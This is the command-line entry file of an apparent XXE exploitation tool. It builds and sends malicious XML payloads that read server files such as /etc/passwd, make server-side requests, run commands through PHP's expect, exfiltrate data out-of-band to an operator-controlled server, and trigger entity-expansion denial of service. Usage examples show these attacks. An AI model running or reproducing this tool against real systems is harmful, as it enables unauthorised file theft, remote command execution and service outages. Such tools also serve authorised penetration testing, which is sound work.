#!/usr/bin/env node

import { PayloadGenerator, Encoding, Type, Mode } from "./PayloadGenerator";
import { XXEServer } from "./XXEServer";

import * as Fs from 'fs';
import { Requester } from "./Requester";
import * as yargs from 'yargs';

const main = async () => {

  console.log('\x1b[32m');

  console.log("    __   ____   ________            _       _ _            ");
  console.log("    \\ \\ / /\\ \\ / /  ____|          | |     (_) |           ");
  console.log("     \\ V /  \\ V /| |__  __  ___ __ | | ___  _| |_ ___ _ __ ");
  console.log("      > <    > < |  __| \\ \\/ / '_ \\| |/ _ \\| | __/ _ \\ '__|");
  console.log("     / . \\  / . \\| |____ >  <| |_) | | (_) | | ||  __/ |   ");
  console.log("    /_/ \\_\\/_/ \\_\\______/_/\\_\\ .__/|_|\\___/|_|\\__\\___|_|   ");
  console.log("                             | |                           ");
  console.log("                             |_|                           ");
  console.log('                                    ///////                  ');
  console.log('         <<<<<<<                   /:::::/      >>>>>>>      ');
  console.log('        <:::::<                   /:::::/        >:::::>     ');
  console.log('       <:::::<                   /:::::/          >:::::>    ');
  console.log('      <:::::<                   /:::::/            >:::::>   ');
  console.log('     <:::::<                   /:::::/              >:::::>  ');
  console.log('    <:::::<                   /:::::/                >:::::> ');
  console.log('   <:::::<                   /:::::/                  >:::::>');
  console.log('    <:::::<                 /:::::/                  >:::::> ');
  console.log('     <:::::<               /:::::/                  >:::::>  ');
  console.log('      <:::::<             /:::::/                  >:::::>   ');
  console.log('       <:::::<           /:::::/                  >:::::>    ');
  console.log('        <:::::<         /:::::/                  >:::::>     ');
  console.log('         <<<<<<<       /:::::/                  >>>>>>>      ');
  console.log('                      /:::::/                                ');
  console.log('                     ///////                                 ');
  console.log('   ');
  console.log('\x1b[0m');


  const argv = yargs
    .usage('Usage: $0 [command] [options]')

    .alias('s', 'server')
    .nargs('s', 1)
    .describe('s', 'Server address for OOB and DTD')

    .alias('p', 'port')
    .nargs('p', 1)
    .describe('p', 'Server port for OOB and DTDs. Default: 7777')

    .alias('t', 'template')
    .nargs('t', 1)
    .describe('t', 'path to an XML template where to inject payload')

    .alias('m', 'mode')
    .nargs('m', 1)
    .describe('m', 'Extraction Mode: xml, oob, cdata. Default: xml')

    .alias('e', 'encode')
    .nargs('e', 1)
    .describe('e', 'Extraction Encoding: none, phpbase64. Default: none')

    .alias('o', 'output')
    .nargs('o', 1)
    .describe('o', 'Output for the XML payload file. Default is to console')



    // .nargs('https', 1)
    // .describe('https', 'Use https in local server')


    .nargs('x', 1)
    .describe('x', 'Use a request to automatically send the xml file')



    .help('h')
    .alias('h', 'help')

    // .nargs('n', 2)
    // .describe('n', '<operation, param> Operations: file (read), request (http(s)), command (through php expect)')

    .command('file [file_to_read]', 'Use XXE to read a file', (yargs: any) => {
      yargs
        .positional('file_to_read', {
          describe: 'File path to read. Absolute path should start with a / (even on windows)',
        });
    })

    .command('request [URL]', 'Use XXE to do a request', (yargs: any) => {
      yargs
        .positional('URL', {
          describe: 'URL to do the request. FTP and other schemas are allowed as well',
        });
    })

    .command('expect [command]', 'Use XXE to execute a command through PHP\'s expect', (yargs: any) => {
      yargs
        .positional('command', {
          describe: 'Command to execute through PHP\'s expect',
        });
    })

    .command('xee [expantions]', 'Generate a huge content by resolving entities', (yargs: any) => {
      yargs
        .positional('expantions', {
          describe: 'Limit of entity expantions',
        });
    })

    // .demandOption(['n'])

    .example('$0 expect ls', '')
    .example('$0 -s 127.0.0.1 expect ls -e phpbase64 -m oob -o output.xml', '')
    .example('$0 -s 127.0.0.1 file /c/windows/win.ini -t xmltemplate.xml -m oob', '')
    .example('$0 xee 900000000 -o output.xml', '')
    .example('$0 file /etc/passwd -x request.txt -t template.xml', '')


    .epilog(`Extra Info:
  - When using the xml or cdata modes, add the placeholder '{{XXE}}' in the field where you want the entity content to be injected
  - When specifiying file paths for windows the format should be as: /c:/windows/win.ini (Notice the first slash).
  - OOB: Out Of Bound: You can use this option to send the data processed by the xml parser, to your local webserver. Usefull with blind attacks
  - When using XML mode, it may break the XML parsing if XML reserved characters are loaded
  - When using the request option, you can specify the placeholder to inject the payload with {{XXE}} or {{XXE_B64}}
  `)

    .argv;


  //Requester.fromTemplate("request_test.txt", "payload", false);


  XXEServer.address = argv.s as string;
  if (argv.p) XXEServer.port = argv.p as number;

  const encoding = argv.e === "phpbase64" ? Encoding.PHP_BASE64 : Encoding.NORMAL;
  const template = argv.t ? Fs.readFileSync(argv.t as string).toString() : undefined;
  const commandarg = argv.command || argv.file_to_read || argv.URL || argv.expantions;
  let xmlPayload;

  if (argv.xee) {
    xmlPayload = PayloadGenerator.xee(argv.xee as number, template);
  }
  else {

    let type = Type.file;
    let mode = Mode.XML;

    if (!argv._ || argv._.length !== 1) {
      yargs.showHelp();
      process.exit();
    }

    switch (argv._[0]) { //command
      case 'file': type = Type.file; break;
      case 'expect': type = Type.expect; break;
      case 'request': type = Type.request; break;
      default: { yargs.showHelp(); process.exit(); }
    }

    switch (argv.m) {
      case 'cdata': mode = Mode.CDATA; break;
      case 'oob': mode = Mode.OOB; break;
      case 'xml': mode = Mode.XML; break;
    }


    xmlPayload = PayloadGenerator.generate(type, mode, encoding, commandarg as string, template);

    if (argv.x) {
      console.log("Doing request");

      const r = await Requester.fromFile(argv.x as string, xmlPayload);
      const filename = Requester.saveResponse(r);

      console.log("Response saved to ./" + filename);
    }

    else if (argv.o) {
      Fs.writeFileSync(argv.o as string, xmlPayload);
      console.log("XML Payload written to " + argv.o);
    }
    else {
      console.log(xmlPayload);
    }

  }



};



main();